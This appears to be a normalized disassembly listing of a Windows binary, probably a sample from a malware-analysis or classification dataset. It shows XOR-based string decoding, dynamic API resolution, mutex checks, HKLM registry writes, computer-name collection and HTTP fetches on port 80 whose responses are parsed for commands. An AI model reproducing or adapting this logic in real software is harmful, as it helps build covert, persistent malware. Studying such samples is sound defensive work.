sub_401000
mov eax sub_407f94
call _EH_prolog
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_401086
push rw-data
call [ LoadLibraryA@IAT ]
mov esi [ GetProcAddress@IAT ]
mov edi eax
push rw-data
push edi
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
call esi
push edi
call [ FreeLibrary@IAT ]
and [ ebp - 0x4 ] 0x0
call sub_4012b3
test eax eax
jne r-xdata
call sub_40559f
push 0x1
pop eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
sub_401086
push esi
push 0x6
push rw-data
call sub_401293
push 0x8
pop esi
push esi
push rw-data
call sub_401293
push 0x20
push rw-data
call sub_401293
push 0x24
push rw-data
call sub_401293
push 0xa
push rw-data
call sub_401293
push 0xe
push rw-data
call sub_401293
push 0x10
push rw-data
call sub_401293
push 0x14
push rw-data
call sub_401293
add esp 0x40
push 0x13
push rw-data
call sub_401293
push esi
push rw-data
call sub_401293
push esi
push rw-data
call sub_401293
push esi
push rw-data
call sub_401293
push 0xa
push rw-data
call sub_401293
push 0xd
push rw-data
call sub_401293
push esi
push rw-data
call sub_401293
push 0xf
push rw-data
call sub_401293
add esp 0x40
push 0xe
push rw-data
call sub_401293
push 0xe
push rw-data
call sub_401293
push 0xa
push rw-data
call sub_401293
push rw-data
call strlen
push 0x7
pop esi
sub eax esi
push eax
push rw-data
call sub_401293
push rw-data
call strlen
sub eax esi
push eax
push rw-data
call sub_401293
push rw-data
call strlen
sub eax esi
push eax
push rw-data
call sub_401293
push rw-data
call strlen
add esp 0x40
sub eax esi
push eax
push rw-data
call sub_401293
push rw-data
call strlen
sub eax esi
push eax
push rw-data
call sub_401293
push rw-data
call strlen
sub eax esi
push eax
push rw-data
call sub_401293
push 0x16
push rw-data
call sub_401293
push 0x9
push rw-data
call sub_401293
push 0x10
push rw-data
call sub_401293
push 0xe
push rw-data
call sub_401293
add esp 0x40
push 0xf
push rw-data
call sub_401293
push 0x13
push rw-data
call sub_401293
push 0x18
push rw-data
call sub_401293
push 0x9
push rw-data
call sub_401293
push 0x16
push rw-data
call sub_401293
add esp 0x28
mov esi rw-data
push esi
call strlen
push eax
push esi
call sub_401293
add esi 0x10
add esp 0xc
cmp esi rw-data
jl r-xdata
pop esi
retn
sub_401293
xor ecx ecx
cmp [ esp + 0x8 ] ecx
jle r-xdata
retn
mov eax [ esp + 0x4 ]
add eax ecx
mov dl [ eax ]
xor dl 0x11
sub dl 0x25
inc ecx
cmp ecx [ esp + 0x8 ]
mov [ eax ] dl
jl r-xdata
sub_4012b3
push ebp
mov ebp esp
sub esp 0x110
push ebx
mov ebx [ LoadLibraryA@IAT ]
push esi
push edi
push rw-data
call ebx
mov esi [ GetProcAddress@IAT ]
mov edi eax
push rw-data
push edi
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
mov [ rw-data ] eax
call esi
push edi
mov edi [ FreeLibrary@IAT ]
mov [ rw-data ] eax
call edi
push rw-data
call ebx
mov ebx eax
push rw-data
push ebx
call esi
push rw-data
push ebx
mov [ rw-data ] eax
call esi
push ebx
mov [ rw-data ] eax
call edi
mov ebx [ SHGetSpecialFolderPathA@IAT ]
xor edi edi
push edi
mov esi rw-data
push 0x26
push esi
push edi
call ebx
push rw-data
push esi
push rw-data
push esi
call [ sprintf@IAT ]
add esp 0x10
push esi
call [ rw-data ]
push edi
mov esi rw-data
push 0x26
push esi
push edi
call ebx
push rw-data
push esi
push rw-data
push esi
call [ sprintf@IAT ]
push rw-data
push rw-data
call strcpy
push rw-data
push rw-data
call strcpy
push rw-data
push rw-data
call strcpy
mov esi rw-data
mov ebx rw-data
push esi
push ebx
call strcpy
push rw-data
push ebx
call strcat
mov ebx rw-data
push esi
push ebx
call strcpy
add esp 0x40
push rw-data
push ebx
call strcat
mov ebx rw-data
push esi
push ebx
call strcpy
push rw-data
push ebx
call strcat
mov ebx rw-data
push esi
push ebx
call strcpy
push rw-data
push ebx
call strcat
mov ebx rw-data
push esi
push ebx
call strcpy
push rw-data
push ebx
call strcat
push esi
mov ebx rw-data
push ebx
call strcpy
add esp 0x40
push rw-data
push ebx
call strcat
mov ebx rw-data
push esi
push ebx
call strcpy
push rw-data
push ebx
call strcat
mov ebx rw-data
push esi
push ebx
call strcpy
push rw-data
push ebx
call strcat
mov ebx rw-data
push esi
push ebx
call strcpy
push rw-data
push ebx
call strcat
mov ebx rw-data
push esi
push ebx
call strcpy
add esp 0x40
push rw-data
push ebx
call strcat
mov ebx rw-data
push esi
push ebx
call strcpy
push rw-data
push ebx
call strcat
push esi
mov esi rw-data
push esi
call strcpy
push rw-data
push esi
call strcat
mov esi [ CreateEventA@IAT ]
add esp 0x28
push rw-data
push edi
push edi
push edi
call esi
push rw-data
push edi
push edi
push edi
mov [ rw-data ] eax
call esi
push rw-data
push edi
push edi
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_40170d
test eax eax
jne r-xdata
push rw-data
call sub_402638
pop ecx
call sub_406dae
neg eax
sbb eax eax
neg eax
mov [ rw-data ] eax
call sub_4018dc
call sub_406ce7
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push edi
push 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_40299d
lea eax [ ebp - 0xc ]
push eax
push edi
push edi
push sub_402d24
push edi
push edi
call [ CreateThread@IAT ]
call sub_40554f
call sub_40286b
call sub_402940
call sub_402952
mov esi [ malloc@IAT ]
mov ebx 0x2000
push ebx
call esi
cmp eax edi
pop ecx
mov [ rw-data ] eax
je r-xdata
call sub_402098
test eax eax
jne r-xdata
call sub_40172c
pop ecx
call sub_401947
test eax eax
je r-xdata
push ebx
call esi
pop ecx
mov [ rw-data ] eax
xor ecx ecx
cmp eax edi
setne cl
mov eax ecx
push rw-data
push rw-data
push 0x80000002
call [ SHDeleteValueA@IAT ]
mov al [ rw-data ]
push 0x40
mov [ ebp - 0x110 ] al
pop ecx
xor eax eax
lea edi [ ebp - 0x10f ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0x104
push eax
lea eax [ ebp - 0x110 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push rw-data
push rw-data
push 0x80000002
call [ SHGetValueA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x110 ]
push eax
call strlen
cmp eax 0x2
pop ecx
jb r-xdata
mov esi 0x12b
push 0x3e8
call [ rw-data ]
mov eax esi
dec esi
test eax eax
jne r-xdata
lea eax [ ebp - 0x110 ]
push eax
call sub_4024c1
test eax eax
pop ecx
jne r-xdata
jmp r-xdata
sub_40172c
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
lea eax [ ebp - 0x8 ]
push edi
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0xc ]
mov ebx rw-data
push eax
mov edi rw-data
push ebx
mov esi 0x80000002
push edi
push esi
mov [ ebp - 0x4 ] 0xff
mov [ ebp - 0x8 ] 0x4
call [ SHGetValueA@IAT ]
mov eax [ ebp + 0x8 ]
cmp [ ebp - 0x4 ] eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push 0x4
push eax
push 0x4
push ebx
push edi
push esi
call [ SHSetValueA@IAT ]
sub_401788
push ebp
mov ebp esp
sub esp 0x8c
push ebx
push esi
xor ebx ebx
push edi
lea eax [ ebp - 0x4 ]
push ebx
mov edi [ RegCreateKeyExA@IAT ]
push eax
push ebx
push 0x2001f
push ebx
push rw-data
push ebx
push rw-data
push 0x80000002
mov [ ebp - 0xc ] 0x80
mov [ ebp - 0x8 ] ebx
call edi
lea eax [ ebp - 0xc ]
mov esi rw-data
push eax
lea eax [ ebp - 0x8c ]
push eax
push ebx
push ebx
push esi
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push rw-data
push rw-data
call strcpy
pop ecx
pop ecx
mov al [ ebp - 0x8c ]
push [ ebp - 0xc ]
mov [ ebp + eax - 0x8c ] bl
lea eax [ ebp - 0x8c ]
push eax
push 0x1
push ebx
push esi
push [ ebp - 0x4 ]
mov esi [ RegSetValueExA@IAT ]
call esi
lea eax [ ebp - 0x4 ]
push ebx
push eax
push ebx
push 0x2001f
push ebx
push rw-data
push ebx
push rw-data
push 0x80000002
call edi
lea eax [ ebp - 0xc ]
mov edi rw-data
push eax
push rw-data
push ebx
push ebx
push edi
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
test eax eax
je r-xdata
inc cl
mov [ ebp + eax - 0x8c ] cl
mov cl [ eax + rw-data ]
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + rw-data ] bl
jmp r-xdata
mov cl al
mov eax [ ebp - 0x8 ]
dec cl
mov [ eax + rw-data ] cl
inc eax
mov [ ebp - 0x8 ] eax
mov al [ ebp + eax - 0x8c ]
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
pop edi
pop esi
pop ebx
je r-xdata
push ebx
call [ time@IAT ]
push eax
call [ srand@IAT ]
pop ecx
pop ecx
call [ rand@IAT ]
push 0x4
push rw-data
push 0x4
push ebx
push edi
mov [ rw-data ] eax
push [ ebp - 0x4 ]
call esi
cmp cl bl
je r-xdata
mov cl [ rw-data ]
xor eax eax
cmp al bl
je r-xdata
leave
retn
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
sub_4018dc
push esi
push edi
mov esi rw-data
xor edi edi
push esi
push edi
push 0x1f0001
call [ OpenMutexA@IAT ]
cmp eax edi
je r-xdata
push esi
push edi
push edi
call [ CreateMutexA@IAT ]
call sub_401788
push rw-data
push rw-data
call sub_4061ab
pop ecx
pop ecx
pop edi
pop esi
retn
push eax
call [ CloseHandle@IAT ]
push [ rw-data ]
call [ SetEvent@IAT ]
push 0x1388
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
push 0x1f4
call [ rw-data ]
sub_401947
push ebp
mov ebp esp
sub esp 0xc
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] 0xff
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push rw-data
push rw-data
push 0x80000002
mov [ ebp - 0x8 ] 0x4
call [ SHGetValueA@IAT ]
xor eax eax
cmp [ ebp - 0x4 ] 0x1
sete al
leave
retn
sub_401987
xor edx edx
cmp [ esp + 0x8 ] edx
jle r-xdata
retn
push ebx
mov eax [ esp + 0x8 ]
lea ecx [ edx + eax ]
mov al [ edx + eax ]
sub al dl
xor al 0x7
mov bl al
shr bl 0x5
shl al 0x3
or bl al
inc edx
cmp edx [ esp + 0xc ]
mov [ ecx ] bl
jl r-xdata
pop ebx
sub_4019b3
push ebp
mov ebp esp
sub esp 0x30
push esi
push edi
push 0x6
mov esi rw-data
pop ecx
lea edi [ ebp - 0x30 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
lea eax [ ebp - 0x30 ]
push 0x19
push eax
movsb [ edi ] [ esi ]
call sub_401987
lea eax [ ebp - 0x14 ]
push 0xe
push eax
call sub_401987
push 0x3e800
call [ malloc@IAT ]
mov esi eax
add esp 0x14
test esi esi
je r-xdata
pop edi
pop esi
leave
retn
lea eax [ ebp - 0x4 ]
push 0x0
push eax
push esi
push 0x0
lea eax [ ebp - 0x14 ]
push rw-data
push eax
lea eax [ ebp - 0x30 ]
push 0x50
push eax
call sub_4071d7
add esp 0x20
test eax eax
je r-xdata
push esi
call [ free@IAT ]
pop ecx
mov eax [ ebp - 0x4 ]
push 0x20
push esi
push rw-data
and [ eax + esi ] 0x0
call [ strncpy@IAT ]
add esp 0xc
sub_401a4a
push ebp
mov ebp esp
sub esp 0x400
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0xd
push edi
call [ strchr@IAT ]
pop ecx
test eax eax
pop ecx
je r-xdata
push edi
call strlen
pop ecx
sub eax edi
jmp r-xdata
push esi
lea eax [ ebp - 0x400 ]
push edi
push eax
call memcpy
mov [ ebp + esi - 0x400 ] 0x3b
and [ ebp + esi - 0x3ff ] 0x0
lea eax [ ebp - 0x400 ]
lea esi [ ebp - 0x400 ]
push eax
dec esi
call strlen
add esp 0x10
lea ebx [ ebp + eax - 0x400 ]
mov esi 0x3fe
mov esi eax
cmp esi 0x400
jb r-xdata
xor eax eax
lea edi [ esi + 0x1 ]
push 0x3b
push edi
call [ strchr@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
and [ esi ] 0x0
cmp [ ebp + 0x10 ] 0x0
je r-xdata
push edi
call strlen
test eax eax
pop ecx
jle r-xdata
push [ ebp + 0xc ]
push edi
call strcmp
pop ecx
pop ecx
cmp esi ebx
jae r-xdata
push eax
push [ ebp + 0xc ]
push edi
call memcmp
add esp 0xc
jmp r-xdata
push 0x1
pop eax
jmp r-xdata
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_401b15
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0x3e800
call [ malloc@IAT ]
mov esi eax
xor edi edi
cmp esi edi
pop ecx
jne r-xdata
lea eax [ ebp - 0x4 ]
push edi
push eax
push esi
push edi
push rw-data
push rw-data
push 0x50
push rw-data
call sub_4071d7
add esp 0x20
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push esi
call [ free@IAT ]
pop ecx
mov eax edi
mov ecx [ ebp - 0x4 ]
xor eax eax
mov cl [ ecx + esi - 0x1 ]
cmp cl [ ebp + 0x8 ]
sete al
mov edi eax
pop edi
pop esi
leave
retn
sub_401b76
push ebp
mov ebp esp
sub esp 0xc
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x0
push rw-data
push [ ebp + 0xc ]
push 0x50
push [ ebp + 0x8 ]
call sub_4071d7
add esp 0x20
test eax eax
jne r-xdata
push esi
push edi
mov esi rw-data
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0xc ]
push 0x8
movsd [ edi ] [ esi ]
push eax
push [ ebp + 0x10 ]
movsb [ edi ] [ esi ]
call memcmp
add esp 0xc
neg eax
sbb eax eax
pop edi
inc eax
pop esi
leave
retn
leave
retn
sub_401bc8
push ebp
mov ebp esp
sub esp 0x3d8
push ebx
push esi
push edi
push 0xff
call sub_401b15
test eax eax
pop ecx
je r-xdata
call sub_4019b3
push 0x5
mov esi rw-data
pop ecx
lea edi [ ebp - 0xd4 ]
[ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0xb0 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0xc0 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x54 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x60 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x90 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x80 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x38 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0xa0 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x70 ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
movsw [ edi ] [ esi ]
lea eax [ ebp - 0xd4 ]
push 0x13
push eax
call sub_401987
lea eax [ ebp - 0xb0 ]
push 0xd
push eax
call sub_401987
push 0xe
lea eax [ ebp - 0xc0 ]
pop esi
push esi
push eax
call sub_401987
lea eax [ ebp - 0x54 ]
push esi
push eax
call sub_401987
lea eax [ ebp - 0x44 ]
push 0x9
push eax
call sub_401987
lea eax [ ebp - 0x60 ]
push 0x9
push eax
call sub_401987
lea eax [ ebp - 0x2c ]
push 0x8
push eax
call sub_401987
lea eax [ ebp - 0x90 ]
push esi
push eax
call sub_401987
add esp 0x40
lea eax [ ebp - 0x20 ]
push 0x8
push eax
call sub_401987
lea eax [ ebp - 0x80 ]
push esi
push eax
call sub_401987
lea eax [ ebp - 0x38 ]
push 0x9
push eax
call sub_401987
lea eax [ ebp - 0xa0 ]
push 0xf
push eax
call sub_401987
lea eax [ ebp - 0x10 ]
push 0x7
push eax
call sub_401987
lea eax [ ebp - 0x70 ]
push 0xd
push eax
call sub_401987
push 0x3e800
call [ malloc@IAT ]
mov ebx eax
add esp 0x34
test ebx ebx
je r-xdata
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x54 ]
push ebx
push eax
lea eax [ ebp - 0xd4 ]
push eax
call sub_401b76
add esp 0x10
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
push ebx
call sub_401987
mov eax [ ebp - 0x8 ]
mov esi [ strstr@IAT ]
and [ eax + ebx ] 0x0
lea eax [ ebp - 0x44 ]
push eax
push ebx
call esi
add esp 0x10
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x54 ]
push ebx
push eax
lea eax [ ebp - 0xb0 ]
push eax
call sub_401b76
add esp 0x10
test eax eax
jne r-xdata
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] 0x200
push eax
lea eax [ ebp - 0x2d4 ]
push eax
call [ GetComputerNameA@IAT ]
lea eax [ ebp - 0x38 ]
push eax
push ebx
call esi
mov edi eax
pop ecx
test edi edi
pop ecx
je r-xdata
lea eax [ ebp - 0x44 ]
push eax
call strlen
mov edi eax
push 0xd
add edi [ ebp - 0x4 ]
push edi
call [ strchr@IAT ]
add esp 0xc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x54 ]
push ebx
push eax
lea eax [ ebp - 0xc0 ]
push eax
call sub_401b76
add esp 0x10
test eax eax
jne r-xdata
lea eax [ ebp - 0xa0 ]
push eax
push ebx
call esi
mov edi eax
pop ecx
test edi edi
pop ecx
je r-xdata
lea eax [ ebp - 0x2d4 ]
push 0x1
push eax
lea eax [ ebp - 0x38 ]
push eax
call strlen
pop ecx
add eax edi
push eax
call sub_401a4a
add esp 0xc
test eax eax
jne r-xdata
push edi
call strlen
pop ecx
sub eax edi
jmp r-xdata
xor esi esi
lea eax [ ebp - 0x10 ]
push eax
push ebx
call esi
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
pop ecx
mov edi rw-data
je r-xdata
lea eax [ ebp - 0x2d4 ]
push 0x1
push eax
lea eax [ ebp - 0xa0 ]
push eax
call strlen
pop ecx
add eax edi
push eax
call sub_401a4a
add esp 0xc
test eax eax
jne r-xdata
push 0x1
pop esi
jmp r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x3d8 ]
push edi
push eax
call memcpy
mov eax [ ebp - 0x4 ]
add esp 0xc
and [ ebp + eax - 0x3d8 ] 0x0
push eax
lea eax [ ebp - 0x3d8 ]
push eax
push 0x1
push rw-data
push rw-data
push 0x80000002
call [ SHSetValueA@IAT ]
mov [ ebp - 0x4 ] 0x103
cmp eax 0x104
mov [ ebp - 0x4 ] eax
jb r-xdata
lea eax [ ebp - 0x70 ]
push eax
push ebx
call esi
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
pop ecx
je r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push edi
push eax
call strlen
add eax [ ebp - 0x4 ]
pop ecx
push eax
call sub_401a4a
add esp 0xc
test eax eax
jne r-xdata
push ebx
call [ free@IAT ]
pop ecx
mov eax esi
jmp r-xdata
mov edi rw-data
lea eax [ ebp - 0x2d4 ]
push edi
push eax
call strcpy
lea eax [ ebp - 0x2d4 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x20 ]
push eax
push ebx
call esi
add esp 0x18
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
push 0x0
lea eax [ ebp - 0x70 ]
push edi
push eax
call strlen
add eax [ ebp - 0x4 ]
pop ecx
push eax
call sub_401a4a
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x80 ]
push eax
push ebx
call esi
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x2d4 ]
push 0x1
push eax
lea eax [ ebp - 0x20 ]
push eax
call strlen
add eax [ ebp - 0x4 ]
pop ecx
push eax
call sub_401a4a
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x2d4 ]
push edi
push eax
call strcpy
lea eax [ ebp - 0x2c ]
push eax
push ebx
call esi
mov edi eax
add esp 0x10
test edi edi
je r-xdata
lea eax [ ebp - 0x2d4 ]
push 0x1
push eax
lea eax [ ebp - 0x80 ]
push eax
call strlen
add eax [ ebp - 0x4 ]
pop ecx
push eax
call sub_401a4a
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x90 ]
push eax
push ebx
call esi
mov edi eax
pop ecx
test edi edi
pop ecx
je r-xdata
lea eax [ ebp - 0x2d4 ]
push 0x1
push eax
lea eax [ ebp - 0x2c ]
push eax
call strlen
pop ecx
add eax edi
push eax
call sub_401a4a
add esp 0xc
test eax eax
je r-xdata
lea eax [ ebp - 0x60 ]
push eax
push ebx
call esi
push ebx
mov esi eax
call [ free@IAT ]
add esp 0xc
xor eax eax
test esi esi
setne al
lea eax [ ebp - 0x2d4 ]
push 0x1
push eax
lea eax [ ebp - 0x90 ]
push eax
call strlen
pop ecx
add eax edi
push eax
call sub_401a4a
add esp 0xc
test eax eax
jne r-xdata
sub_402098
push ebp
mov ebp esp
sub esp 0x2c0
push ebx
push esi
push edi
push 0xfe
call sub_401b15
test eax eax
pop ecx
je r-xdata
call sub_4019b3
push 0x5
mov esi rw-data
pop ecx
lea edi [ ebp - 0xc0 ]
[ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x9c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0xac ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x4c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x7c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x6c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x8c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov eax [ rw-data ]
push 0x13
movsb [ edi ] [ esi ]
mov esi rw-data
lea edi [ ebp - 0x5c ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x18 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ rw-data ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
movsd [ edi ] [ esi ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc0 ]
push eax
movsb [ edi ] [ esi ]
call sub_401987
push 0xd
lea eax [ ebp - 0x9c ]
pop esi
push esi
push eax
call sub_401987
lea eax [ ebp - 0xac ]
push 0xe
push eax
call sub_401987
lea eax [ ebp - 0x40 ]
push esi
push eax
call sub_401987
lea eax [ ebp - 0x4c ]
push 0x8
push eax
call sub_401987
lea eax [ ebp - 0x18 ]
push 0x7
push eax
call sub_401987
lea eax [ ebp - 0x7c ]
push esi
push eax
call sub_401987
lea eax [ ebp - 0x10 ]
push 0x7
push eax
call sub_401987
add esp 0x40
lea eax [ ebp - 0x6c ]
push esi
push eax
call sub_401987
lea eax [ ebp - 0x30 ]
push 0x8
push eax
call sub_401987
lea eax [ ebp - 0x8c ]
push 0xe
push eax
call sub_401987
lea eax [ ebp - 0x20 ]
push 0x6
push eax
call sub_401987
lea eax [ ebp - 0x5c ]
push 0xc
push eax
call sub_401987
push 0x3e800
call [ malloc@IAT ]
mov edi eax
add esp 0x2c
test edi edi
je r-xdata
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x40 ]
push edi
push eax
lea eax [ ebp - 0xc0 ]
push eax
call sub_401b76
add esp 0x10
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
push edi
call sub_401987
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
and [ eax + edi ] 0x0
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x2c0 ]
push eax
mov [ ebp - 0x24 ] 0x200
call [ GetComputerNameA@IAT ]
mov esi [ strstr@IAT ]
lea eax [ ebp - 0x30 ]
push eax
push edi
call esi
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x40 ]
push edi
push eax
lea eax [ ebp - 0x9c ]
push eax
call sub_401b76
add esp 0x10
test eax eax
jne r-xdata
lea eax [ ebp - 0x8c ]
push eax
push edi
call esi
mov ebx eax
pop ecx
test ebx ebx
pop ecx
je r-xdata
lea eax [ ebp - 0x2c0 ]
push 0x1
push eax
lea eax [ ebp - 0x30 ]
push eax
call strlen
pop ecx
add eax ebx
push eax
call sub_401a4a
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x40 ]
push edi
push eax
lea eax [ ebp - 0xac ]
push eax
call sub_401b76
add esp 0x10
test eax eax
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
push edi
call esi
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
pop ecx
mov ebx rw-data
je r-xdata
lea eax [ ebp - 0x2c0 ]
push 0x1
push eax
lea eax [ ebp - 0x8c ]
push eax
call strlen
pop ecx
add eax ebx
push eax
call sub_401a4a
add esp 0xc
test eax eax
jne r-xdata
push 0x1
pop esi
jmp r-xdata
xor esi esi
lea eax [ ebp - 0x5c ]
push eax
push edi
call esi
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
pop ecx
je r-xdata
push 0x0
lea eax [ ebp - 0x20 ]
push ebx
push eax
call strlen
add eax [ ebp - 0x4 ]
pop ecx
push eax
call sub_401a4a
add esp 0xc
test eax eax
jne r-xdata
push edi
call [ free@IAT ]
pop ecx
mov eax esi
jmp r-xdata
mov ebx rw-data
lea eax [ ebp - 0x2c0 ]
push ebx
push eax
call strcpy
